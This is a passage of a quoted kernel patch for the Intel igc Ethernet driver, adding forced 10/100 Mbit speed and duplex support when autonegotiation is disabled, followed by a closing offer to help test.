-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     Asym_Pause);
-+			break;
-+		case igc_fc_tx_pause:
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     Asym_Pause);
-+			break;
-+		default:
-+			break;
-+		}
-+	} else {
-+		cmd->base.autoneg = AUTONEG_DISABLE;
-+	}
-
--	/* Set pause flow control settings */
-+	/* Pause is always supported */
- 	ethtool_link_ksettings_add_link_mode(cmd, supported, Pause);
-
--	switch (hw->fc.requested_mode) {
--	case igc_fc_full:
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, Pause);
--		break;
--	case igc_fc_rx_pause:
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, Pause);
--		ethtool_link_ksettings_add_link_mode(cmd, advertising,
--						     Asym_Pause);
--		break;
--	case igc_fc_tx_pause:
--		ethtool_link_ksettings_add_link_mode(cmd, advertising,
--						     Asym_Pause);
--		break;
--	default:
--		break;
--	}
--
- 	status = pm_runtime_suspended(&adapter->pdev->dev) ?
- 		 0 : rd32(IGC_STATUS);
-
-@@ -1983,7 +1997,6 @@ static int igc_ethtool_get_link_ksettings(struct net_device *netdev,
- 		cmd->base.duplex = DUPLEX_UNKNOWN;
- 	}
- 	cmd->base.speed = speed;
--	cmd->base.autoneg = AUTONEG_ENABLE;
-
- 	/* MDI-X => 2; MDI =>1; Invalid =>0 */
- 	if (hw->phy.media_type == igc_media_type_copper)
-@@ -2000,6 +2013,41 @@ static int igc_ethtool_get_link_ksettings(struct net_device *netdev,
- 	return 0;
- }
-
-+/**
-+ * igc_handle_autoneg_disabled - Configure forced speed/duplex settings
-+ * @adapter: private driver structure
-+ * @speed: requested speed (must be SPEED_10 or SPEED_100)
-+ * @duplex: requested duplex
-+ *
-+ * Records forced speed/duplex when autoneg is disabled.
-+ * Caller must validate speed before calling this function.
-+ */
-+static void igc_handle_autoneg_disabled(struct igc_adapter *adapter, u32 speed,
-+					u8 duplex)
-+{
-+	struct igc_mac_info *mac = &adapter->hw.mac;
-+
-+	switch (speed) {
-+	case SPEED_10:
-+		mac->forced_speed_duplex = (duplex == DUPLEX_FULL) ?
-+			IGC_FORCED_10F : IGC_FORCED_10H;
-+		break;
-+	case SPEED_100:
-+		mac->forced_speed_duplex = (duplex == DUPLEX_FULL) ?
-+			IGC_FORCED_100F : IGC_FORCED_100H;
-+		break;
-+	default:
-+		WARN_ONCE(1, "Unsupported speed %u\n", speed);
-+		return;
-+	}
-+
-+	mac->autoneg_enabled = false;
-+
-+	/* Half-duplex cannot support flow control per IEEE 802.3 */
-+	if (duplex == DUPLEX_HALF)
-+		adapter->hw.fc.requested_mode = igc_fc_none;
-+}
-+
- /**
-  * igc_handle_autoneg_enabled - Configure autonegotiation advertisement
-  * @adapter: private driver structure
-@@ -2038,6 +2086,7 @@ static void igc_handle_autoneg_enabled(struct igc_adapter *adapter,
- 						  10baseT_Half))
- 		advertised |= ADVERTISE_10_HALF;
-
-+	hw->mac.autoneg_enabled = true;
- 	hw->phy.autoneg_advertised = advertised;
- 	if (adapter->fc_autoneg)
- 		hw->fc.requested_mode = igc_fc_default;
-@@ -2071,14 +2120,20 @@ igc_ethtool_set_link_ksettings(struct net_device *netdev,
- 		}
- 	}
-
-+	if (cmd->base.autoneg == AUTONEG_DISABLE &&
-+	    cmd->base.speed != SPEED_10 && cmd->base.speed != SPEED_100) {
-+		netdev_info(dev, "Unsupported speed for forced link\n");
-+		return -EINVAL;
-+	}
-+
- 	while (test_and_set_bit(__IGC_RESETTING, &adapter->state))
- 		usleep_range(1000, 2000);
-
--	if (cmd->base.autoneg == AUTONEG_ENABLE) {
-+	if (cmd->base.autoneg == AUTONEG_ENABLE)
- 		igc_handle_autoneg_enabled(adapter, cmd);
--	} else {
--		netdev_info(dev, "Force mode currently not supported\n");
--	}
-+	else
-+		igc_handle_autoneg_disabled(adapter, cmd->base.speed,
-+					    cmd->base.duplex);
-
- 	/* MDI-X => 2; MDI => 1; Auto => 3 */
- 	if (cmd->base.eth_tp_mdix_ctrl) {
-diff --git a/drivers/net/ethernet/intel/igc/igc_hw.h b/drivers/net/ethernet/intel/igc/igc_hw.h
-index 86ab8f566f44..62aaee55668a 100644
---- a/drivers/net/ethernet/intel/igc/igc_hw.h
-+++ b/drivers/net/ethernet/intel/igc/igc_hw.h
-@@ -73,6 +73,13 @@ struct igc_info {
-
- extern const struct igc_info igc_base_info;
-
-+enum igc_forced_speed_duplex {
-+	IGC_FORCED_10H,
-+	IGC_FORCED_10F,
-+	IGC_FORCED_100H,
-+	IGC_FORCED_100F,
-+};
-+
- struct igc_mac_info {
- 	struct igc_mac_operations ops;
-
-@@ -93,6 +100,8 @@ struct igc_mac_info {
- 	bool arc_subsystem_valid;
-
- 	bool get_link_status;
-+	bool autoneg_enabled;
-+	enum igc_forced_speed_duplex forced_speed_duplex;
- };
-
- struct igc_nvm_operations {
-diff --git a/drivers/net/ethernet/intel/igc/igc_mac.c b/drivers/net/ethernet/intel/igc/igc_mac.c
-index 142beb9ae557..8bbb6d5581c7 100644
---- a/drivers/net/ethernet/intel/igc/igc_mac.c
-+++ b/drivers/net/ethernet/intel/igc/igc_mac.c
-@@ -446,6 +446,16 @@ s32 igc_config_fc_after_link_up(struct igc_hw *hw)
- 	u16 speed, duplex;
- 	s32 ret_val = 0;
-
-+	/* When autoneg is disabled, force the MAC flow control settings
-+	 * to match the "fc" parameter.
-+	 */
-+	if (!hw->mac.autoneg_enabled) {
-+		ret_val = igc_force_mac_fc(hw);
-+		if (ret_val)
-+			hw_dbg("Error forcing flow control settings\n");
-+		goto out;
-+	}
-+
- 	/* In auto-neg, we need to check and see if Auto-Neg has completed,
- 	 * and if so, how the PHY and link partner has flow control
- 	 * configured.
-diff --git a/drivers/net/ethernet/intel/igc/igc_main.c b/drivers/net/ethernet/intel/igc/igc_main.c
-index 72bc5128d8b8..437e1d1ef1e4 100644
---- a/drivers/net/ethernet/intel/igc/igc_main.c
-+++ b/drivers/net/ethernet/intel/igc/igc_main.c
-@@ -7298,7 +7298,7 @@ static int igc_probe(struct pci_dev *pdev,
- 	/* Initialize link properties that are user-changeable */
- 	adapter->fc_autoneg = true;
- 	hw->phy.autoneg_advertised = 0xaf;
--
-+	hw->mac.autoneg_enabled = true;
- 	hw->fc.requested_mode = igc_fc_default;
- 	hw->fc.current_mode = igc_fc_default;
-
-diff --git a/drivers/net/ethernet/intel/igc/igc_phy.c b/drivers/net/ethernet/intel/igc/igc_phy.c
-index 6c4d204aecfa..4cf737fb3b21 100644
---- a/drivers/net/ethernet/intel/igc/igc_phy.c
-+++ b/drivers/net/ethernet/intel/igc/igc_phy.c
-@@ -494,12 +494,20 @@ s32 igc_setup_copper_link(struct igc_hw *hw)
- 	s32 ret_val = 0;
- 	bool link;
-
--	/* Setup autoneg and flow control advertisement and perform
--	 * autonegotiation.
--	 */
--	ret_val = igc_copper_link_autoneg(hw);
--	if (ret_val)
--		goto out;
-+	if (hw->mac.autoneg_enabled) {
-+		/* Setup autoneg and flow control advertisement and perform
-+		 * autonegotiation.
-+		 */
-+		ret_val = igc_copper_link_autoneg(hw);
-+		if (ret_val)
-+			goto out;
-+	} else {
-+		ret_val = hw->phy.ops.force_speed_duplex(hw);
-+		if (ret_val) {
-+			hw_dbg("Error Forcing Speed/Duplex\n");
-+			goto out;
-+		}
-+	}
-
- 	/* Check link status. Wait up to 100 microseconds for link to become
- 	 * valid.
-@@ -778,3 +786,48 @@ u16 igc_read_phy_fw_version(struct igc_hw *hw)
-
- 	return gphy_version;
- }
-+
-+/**
-+ * igc_force_speed_duplex - Force PHY speed and duplex settings
-+ * @hw: pointer to the HW structure
-+ *
-+ * Programs the GPY PHY control register to disable autonegotiation
-+ * and force the speed/duplex indicated by hw->mac.forced_speed_duplex.
-+ */
-+s32 igc_force_speed_duplex(struct igc_hw *hw)
-+{
-+	struct igc_phy_info *phy = &hw->phy;
-+	u16 phy_ctrl;
-+	s32 ret_val;
-+
-+	ret_val = phy->ops.read_reg(hw, PHY_CONTROL, &phy_ctrl);
-+	if (ret_val)
-+		return ret_val;
-+
-+	phy_ctrl &= ~(MII_CR_SPEED_MASK | MII_CR_DUPLEX_EN |
-+		      MII_CR_AUTO_NEG_EN | MII_CR_RESTART_AUTO_NEG);
-+
-+	switch (hw->mac.forced_speed_duplex) {
-+	case IGC_FORCED_10H:
-+		phy_ctrl |= MII_CR_SPEED_10;
-+		break;
-+	case IGC_FORCED_10F:
-+		phy_ctrl |= MII_CR_SPEED_10 | MII_CR_DUPLEX_EN;
-+		break;
-+	case IGC_FORCED_100H:
-+		phy_ctrl |= MII_CR_SPEED_100;
-+		break;
-+	case IGC_FORCED_100F:
-+		phy_ctrl |= MII_CR_SPEED_100 | MII_CR_DUPLEX_EN;
-+		break;
-+	default:
-+		return -IGC_ERR_CONFIG;
-+	}
-+
-+	ret_val = phy->ops.write_reg(hw, PHY_CONTROL, phy_ctrl);
-+	if (ret_val)
-+		return ret_val;
-+
-+	hw->mac.get_link_status = true;
-+	return 0;
-+}
-diff --git a/drivers/net/ethernet/intel/igc/igc_phy.h b/drivers/net/ethernet/intel/igc/igc_phy.h
-index 832a7e359f18..d37a89174826 100644
---- a/drivers/net/ethernet/intel/igc/igc_phy.h
-+++ b/drivers/net/ethernet/intel/igc/igc_phy.h
-@@ -18,5 +18,6 @@ void igc_power_down_phy_copper(struct igc_hw *hw);
- s32 igc_write_phy_reg_gpy(struct igc_hw *hw, u32 offset, u16 data);
- s32 igc_read_phy_reg_gpy(struct igc_hw *hw, u32 offset, u16 *data);
- u16 igc_read_phy_fw_version(struct igc_hw *hw);
-+s32 igc_force_speed_duplex(struct igc_hw *hw);
-
- #endif
---
-2.43.0
-
+Please let me know if you need more information or if I can help test a pat=
+ch.
 
